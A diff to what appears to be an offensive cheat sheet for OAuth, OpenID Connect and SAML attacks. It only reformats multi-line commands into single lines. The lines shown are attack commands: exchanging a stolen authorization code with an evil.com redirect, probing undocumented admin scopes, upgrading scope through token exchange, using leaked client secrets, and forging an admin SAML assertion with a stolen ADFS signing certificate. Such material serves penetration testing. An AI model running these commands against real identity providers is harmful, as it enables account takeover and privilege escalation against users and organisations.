@@ -52,8 +52,7 @@ https://<authserver>/authorize?client_id=<id>&redirect_uri=https://app.com/callb
 
 # Craft malicious link for victim — victim clicks, code sent to attacker
 # Attacker exchanges code for token at token endpoint
-curl -s -X POST "https://<authserver>/token" \
-  -d "grant_type=authorization_code&code=<stolen_code>&redirect_uri=https://evil.com&client_id=<id>&client_secret=<secret>"
+curl -s -X POST "https://<authserver>/token" -d "grant_type=authorization_code&code=<stolen_code>&redirect_uri=https://evil.com&client_id=<id>&client_secret=<secret>"
 ```
 
 ### `state` CSRF
@@ -92,22 +91,19 @@ curl -s "https://<authserver>/authorize?client_id=<id>&scope=openid+profile+emai
 # Try undocumented scopes
 for scope in admin superuser read:all write:all offline_access; do
   echo -n "$scope: "
-  code=$(curl -so /dev/null -w "%{http_code}" \
-    "https://<authserver>/authorize?client_id=<id>&scope=$scope&response_type=code&redirect_uri=<url>")
+  code=$(curl -so /dev/null -w "%{http_code}" "https://<authserver>/authorize?client_id=<id>&scope=$scope&response_type=code&redirect_uri=<url>")
   echo "$code"
 done
 
 # Token exchange — if token has scope, can it be upgraded?
-curl -s -X POST "https://<authserver>/token" \
-  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=<token>&requested_token_type=urn:ietf:params:oauth:token-type:access_token&scope=admin"
+curl -s -X POST "https://<authserver>/token" -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=<token>&requested_token_type=urn:ietf:params:oauth:token-type:access_token&scope=admin"
 ```
 
 ### Client Credentials Abuse
 
 ```bash
 # Leaked client_id/client_secret → get token directly
-curl -s -X POST "https://<authserver>/token" \
-  -d "grant_type=client_credentials&client_id=<id>&client_secret=<secret>&scope=openid profile"
+curl -s -X POST "https://<authserver>/token" -d "grant_type=client_credentials&client_id=<id>&client_secret=<secret>&scope=openid profile"
 
 # Find secrets in:
 # - JavaScript source: client_secret, client_id
@@ -275,11 +271,7 @@ python3 ADFSDump.py -p <adfs-password>
 
 # Forge assertion with stolen cert:
 # https://github.com/secureworks/whiskeysamlandfriends
-python3 GoldenSAML.py \
-  --cert adfs-signing.pfx --certpass <pass> \
-  --target "https://<sp>/saml/acs" \
-  --nameid "admin@target.com" \
-  --role "Admin"
+python3 GoldenSAML.py --cert adfs-signing.pfx --certpass <pass> --target "https://<sp>/saml/acs" --nameid "admin@target.com" --role "Admin"
 ```
 
 ---
@@ -317,8 +309,7 @@ curl -s "https://<target>/.well-known/openid-configuration" | python3 -m json.to
 # https://<authserver>/authorize?client_id=X&redirect_uri=https://evil.com&response_type=code&scope=openid
 
 # Exchange stolen code
-curl -s -X POST "https://<authserver>/token" \
-  -d "grant_type=authorization_code&code=<stolen>&redirect_uri=https://evil.com&client_id=X&client_secret=Y"
+curl -s -X POST "https://<authserver>/token" -d "grant_type=authorization_code&code=<stolen>&redirect_uri=https://evil.com&client_id=X&client_secret=Y"
 
 # Decode SAML response
 echo "<saml>" | base64 -d | xmllint --format -
